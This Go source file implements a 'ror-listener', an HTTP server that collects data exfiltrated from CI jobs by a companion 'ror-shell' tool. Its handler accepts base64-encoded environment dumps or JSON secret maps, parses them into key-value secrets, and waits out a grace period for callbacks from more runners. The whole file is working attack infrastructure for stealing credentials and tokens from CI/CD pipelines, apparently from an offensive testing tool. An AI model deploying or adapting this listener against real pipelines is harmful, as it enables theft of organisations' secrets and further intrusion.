package cmd

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

const maxListenerResults = 100

const listenerGracePeriod = 5 * time.Second

// CallbackResult holds the result of a single received callback.
type CallbackResult struct {
	Addr    string            `json:"addr"`
	Secrets map[string]string `json:"secrets"`
	Raw     string            `json:"raw,omitempty"`
	Time    time.Time         `json:"time"`
}

// Listener is an HTTP server that receives exfiltrated data from ror-shell jobs.
type Listener struct {
	srv     *http.Server
	addr    string
	results []*CallbackResult
	mu      sync.RWMutex
	out     io.Writer
	ready   chan struct{}
}

// NewListener creates a new ror-shell listener.
func NewListener(listenAddr string, out io.Writer) *Listener {
	return &Listener{
		addr:    listenAddr,
		out:     out,
		results: make([]*CallbackResult, 0),
		ready:   make(chan struct{}),
	}
}

// Addr returns the actual listen address after the server starts.
func (l *Listener) Addr() string {
	l.mu.RLock()
	defer l.mu.RUnlock()
	return l.addr
}

// Ready returns a channel that is closed when the listener is bound and serving.
func (l *Listener) Ready() <-chan struct{} {
	return l.ready
}

// Run starts the HTTP server and blocks until context is cancelled.
func (l *Listener) Run(ctx context.Context) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", l.handleExfil)
	mux.HandleFunc("/health", l.handleHealth)

	srv := &http.Server{
		Addr:              l.addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      10 * time.Second,
		IdleTimeout:       60 * time.Second,
	}

	l.mu.Lock()
	l.srv = srv
	l.mu.Unlock()

	ln, err := net.Listen("tcp", l.addr)
	if err != nil {
		return fmt.Errorf("listen %s: %w", l.addr, err)
	}

	l.mu.Lock()
	l.addr = ln.Addr().String()
	l.mu.Unlock()

	fmt.Fprintf(l.out, "[ror-listener] listening on %s\n", l.addr)

	close(l.ready)

	// Local cancel so the shutdown-watcher goroutine exits when Serve returns.
	localCtx, localCancel := context.WithCancel(ctx)
	defer localCancel()

	go func() { //nolint:gosec // G118: context.Background is intentional — parent ctx is already Done when this fires
		<-localCtx.Done()
		shutCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = srv.Shutdown(shutCtx)
	}()

	if err := srv.Serve(ln); err != nil && !errors.Is(err, http.ErrServerClosed) {
		return fmt.Errorf("serve: %w", err)
	}
	return nil
}

// Stop gracefully shuts down the listener.
func (l *Listener) Stop(ctx context.Context) error {
	l.mu.RLock()
	srv := l.srv
	l.mu.RUnlock()
	if srv == nil {
		return nil
	}
	return srv.Shutdown(ctx)
}

// WaitFor blocks until the context is done, the timeout expires, or data is
// received. After the first callback arrives, a grace period allows additional
// multi-runner callbacks to accumulate before returning.
func (l *Listener) WaitFor(ctx context.Context, timeout time.Duration) ([]*CallbackResult, error) {
	timer := time.NewTimer(timeout)
	defer timer.Stop()
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	var graceDeadline time.Time

	for {
		select {
		case <-ctx.Done():
			return l.getResults(), nil
		case <-timer.C:
			return l.getResults(), nil
		case <-ticker.C:
			l.mu.RLock()
			n := len(l.results)
			l.mu.RUnlock()

			if n > 0 && graceDeadline.IsZero() {
				graceDeadline = time.Now().Add(listenerGracePeriod)
				fmt.Fprintf(l.out, "[ror-listener] first callback received, waiting %s for additional runners...\n", listenerGracePeriod)
			}

			if !graceDeadline.IsZero() && time.Now().After(graceDeadline) {
				return l.getResults(), nil
			}
		}
	}
}

// getResults returns a copy of collected results.
func (l *Listener) getResults() []*CallbackResult {
	l.mu.RLock()
	defer l.mu.RUnlock()
	cp := make([]*CallbackResult, len(l.results))
	copy(cp, l.results)
	return cp
}

// handleExfil receives base64-encoded env dump or JSON secrets from CI jobs.
func (l *Listener) handleExfil(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	l.mu.RLock()
	count := len(l.results)
	l.mu.RUnlock()
	if count >= maxListenerResults {
		http.Error(w, "result limit reached", http.StatusTooManyRequests)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 5<<20)) // 5MB max
	if err != nil || len(body) == 0 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	result := &CallbackResult{
		Addr: r.RemoteAddr,
		Time: time.Now().UTC(),
	}

	// Try to decode as base64-encoded env dump
	raw := strings.TrimSpace(string(body))
	if decoded, err := base64.StdEncoding.DecodeString(raw); err == nil && len(decoded) > 0 {
		result.Raw = string(decoded)
		result.Secrets = parseEnvVars(string(decoded))
	} else if decoded, err := base64.RawStdEncoding.DecodeString(raw); err == nil && len(decoded) > 0 {
		result.Raw = string(decoded)
		result.Secrets = parseEnvVars(string(decoded))
	} else {
		// Try as JSON secrets
		var secrets map[string]string
		if err := json.Unmarshal(body, &secrets); err == nil && len(secrets) > 0 {
			result.Secrets = secrets
			result.Raw = string(body)
		} else {
			result.Raw = string(body)
			result.Secrets = parseEnvVars(string(body))
		}
	}

	l.mu.Lock()
	l.results = append(l.results, result)
	n := len(l.results)
	l.mu.Unlock()

	fmt.Fprintf(w, `{"status":"ok","received":%d}`+"\n", n)
}

// handleHealth returns a simple health check response.
func (l *Listener) handleHealth(w http.ResponseWriter, r *http.Request) {
	l.mu.RLock()
	count := len(l.results)
	l.mu.RUnlock()
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{
		"status":    "ok",
		"results":   count,
		"listening": true,
	})
}

// parseEnvVars parses raw env var output into a map.
func parseEnvVars(raw string) map[string]string {
	secrets := make(map[string]string)
	for line := range strings.SplitSeq(raw, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		idx := strings.IndexByte(line, '=')
		if idx <= 0 {
			continue
		}
		key := line[:idx]
		value := line[idx+1:]
		secrets[key] = value
	}
	return secrets
}
